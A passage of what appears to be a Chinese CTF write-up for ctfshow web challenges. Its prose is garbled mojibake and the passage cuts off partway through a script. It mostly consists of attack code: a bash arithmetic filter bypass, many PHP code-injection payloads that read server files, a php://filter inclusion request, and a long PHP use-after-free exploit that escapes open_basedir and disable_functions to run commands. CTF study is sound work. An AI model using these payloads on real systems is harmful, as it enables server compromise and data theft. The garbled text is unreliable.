é€’æ•°å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ç”¨åˆ°å–åè¿ç®—</p><p>ä¸‹é¢æˆ‘åœ¨çº¢å¸½ä¸‹é¢æ¼”ç¤ºä¸€ä¸‹è¿™ä¸ªæ­¥éª¤</p><p>é¦–å…ˆè¦çŸ¥é“çš„æ˜¯å½“$(())æ²¡æœ‰å‚æ•°æ—¶ã€‚é»˜è®¤ä¸º0</p><p>æ‰€ä»¥å…¶å®è¯´åˆ°è¿™é‡Œå¤§å®¶ä¹Ÿéƒ½ç›´åˆ°äº†ï¼Œ0çš„å–åä¸º-1ï¼Œç„¶ååªè¦ä¸€ç›´è¿™æ ·ç›¸åŠ å†å–åå°±èƒ½å¾—åˆ°36ï¼ˆå› ä¸ºé¢˜ç›®è¿‡æ»¤äº†ä¹˜å·ï¼Œæ²¡æœ‰è¿‡æ»¤åŠ å·ï¼‰</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))))))</span><br><span class="line"># $&#123;_&#125; =&quot;&quot; //è¿”å›ä¸Šä¸€æ¬¡å‘½ä»¤</span><br><span class="line">$(($&#123;_&#125;))=<span class="number">0</span></span><br><span class="line">$((~$(($&#123;_&#125;))))=-<span class="number">1</span></span><br><span class="line">$((~$(())~$(()))) = -<span class="number">1</span>-<span class="number">1</span>=-<span class="number">2</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨pythonæ„é€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">&quot;$((~$((&quot;</span>+<span class="string">&quot;$((~$(())))&quot;</span>*<span class="number">37</span>+<span class="string">&quot;))))&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><h4><span id="web58">web58</span></h4><p>Â·Â·Â·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬å…ˆè¦è·å–å½“å‰ç›®å½•ï¼Œç„¶åè¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>))));ã€€ã€€<span class="comment">// .ä¸ºå½“å‰ç›®å½•ï¼Œ..ä¸ºä¸Šçº§ç›®å½•ï¼Œscandir(&quot;.&quot;)è¯»å‡ºçš„æ•°ç»„ä¸º .. . flag.php index.php</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>))));</span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;*&quot;</span>)));ã€€ã€€<span class="comment">//glob(&quot;*&quot;)è¯»å‡ºæ•°ç»„ä¸º flag.php  index.php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//è¿™é‡Œæˆ‘ä»¬çŸ¥é“ /var/www/html/ ç›®å½•ä¸­åªæœ‰ index.php å’Œ flag.php ä¸¤ä¸ªæ–‡ä»¶ï¼Œå› æ­¤ç›´æ¥è¯»å–flag.php</span></span><br><span class="line"><span class="comment">//ç›´æ¥è¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;falg.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å…ˆè¯»å–ï¼Œå†è¾“å‡ºï¼Œä¸‹åˆ—éœ€è¦å³å‡»æŸ¥çœ‹æºä»£ç </span></span><br><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">php_strip_whitespace</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgets</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// è¯»å–ä¸€è¡Œ</span></span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetcsv</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&quot;r&quot;</span>), <span class="number">1000</span>));<span class="comment">// è¯»å–ä¸€è¡Œ</span></span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fscanf</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));<span class="comment">// è¯»å–ä¸€è¡Œ</span></span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetss</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// ä»æ–‡ä»¶æŒ‡é’ˆä¸­è¯»å–ä¸€è¡Œå¹¶è¿‡æ»¤æ‰ HTML æ ‡è®°</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_ini_file</span>(<span class="string">&#x27;flag.php&#x27;</span>)); <span class="comment">// å¤±è´¥æ—¶è¿”å› false , æˆåŠŸè¿”å›é…ç½®æ•°ç»„</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//éœ€è¦å…ˆæ‰“å¼€æ–‡ä»¶ï¼Œå†è¯»å–å†…å®¹ï¼Œæœ€åè¾“å‡º</span></span><br><span class="line">c=<span class="title function_ invoke__">fpassthru</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),<span class="number">1000</span>));</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ–‡ä»¶åŒ…å«ï¼Œåé¢var_dump(get_defined_vars());å¯ä»¥ä¸å†™</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line">c=<span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line"><span class="comment"># å¯ä»¥ç”¨var_exportä»£æ›¿var_dump</span></span><br><span class="line"><span class="title function_ invoke__">var_export</span>(<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>));</span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ–‡ä»¶</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">array_slice</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>),<span class="number">6</span>,<span class="number">1</span>)));ã€€ã€€<span class="comment">//è¿™é‡Œæä¾›ä¸€ç§æ€è·¯ï¼Œå½“flagè¢«å±è”½æ—¶ï¼Œphpä¸æ”¯æŒé€šé…ç¬¦ï¼Œsqlæ”¯æŒ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ–‡ä»¶åŒ…å«ä¼ é€’ä¼ªåè®®</span></span><br><span class="line">POST</span><br><span class="line">c=<span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line">GET</span><br><span class="line"><span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">POST /?<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php HTTP/1.1</span></span><br><span class="line">Host: eb8e8295-<span class="number">2</span>ab7-<span class="number">4522</span>-<span class="number">9</span>c27-d7d70b69c967.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10_15_7</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Length: 19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">c=include $_GET[1];</span></span><br></pre></td></tr></table></figure><ul><li><p>POSTè¯·æ±‚è¦åŠ ä¸Š</p><p><code>Content-Type: application/x-www-form-urlencoded</code></p></li></ul><p>æˆ–è€…ç”¨èšå‰‘ç›´è¿</p><h4><span id="web71">web71</span></h4><ul><li>åœ¨ä»£ç æ‰§è¡Œç»“æŸåå¦‚æœæƒ³è·³è¿‡å…¶ä½™éƒ¨åˆ†ï¼Œå¯ä»¥ä½¿ç”¨<code>exit();</code>æˆ–è€…<code>die()</code>æ–¹æ³•é€€å‡º</li></ul><h4><span id="web72">web72</span></h4><p>å°è¯•è¯»å–æ ¹ç›®å½•ï¼Œä½†æ˜¯å¤±è´¥äº†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$d</span>=opendir(<span class="string">&quot;/&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=readdir(<span class="variable">$d</span>)))&#123;<span class="built_in">echo</span><span class="string">&quot;<span class="variable">$f</span>\n&quot;</span>;&#125;;<span class="built_in">exit</span>();</span><br></pre></td></tr></table></figure><ul><li>è¿™é¢˜éœ€è¦ç”¨globåè®®è¯»å–æ ¹ç›®å½•ï¼Œç„¶ååˆ©ç”¨uafè„šæœ¬å‘½ä»¤æ‰§è¡Œã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&quot;glob:// /*.txt&quot;</span>;                         <span class="comment">//glob:///*.txtåº”è¯¥è¿èµ·æ¥å†™ï¼Œä¸­é—´ç©ºäº†ä¸€ä¸‹åªæ˜¯æ–¹ä¾¿ç†è§£</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>Payloadæ„é€ </p><p><code>c=$a=&quot;glob:///*.txt&quot;;if($b=opendir($a))&#123;while(($file=readdir($b))!==false)&#123;echo &quot;filename:&quot;.$file.&quot;\n&quot;;&#125;closedir($b);&#125;exit();</code></p><p>å‘ç°<em>flag0.txt</em>æ–‡ä»¶</p><p>ä½†æ˜¯ç”±äº<code>open_basedir</code>çš„é™åˆ¶ï¼Œè¿˜æ˜¯ä¸å¯ä»¥ç›´æ¥includeè¿›æ¥ï¼Œéœ€è¦æƒ³å…¶å®ƒçš„åŠæ³•ã€‚ä½¿ç”¨UAFã€‚è„šæœ¬å¦‚ä¸‹ï¼šè®°å¾—è¦æŠŠ<code>c=</code>ä¹‹åçš„å†…å®¹urlç¼–ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span 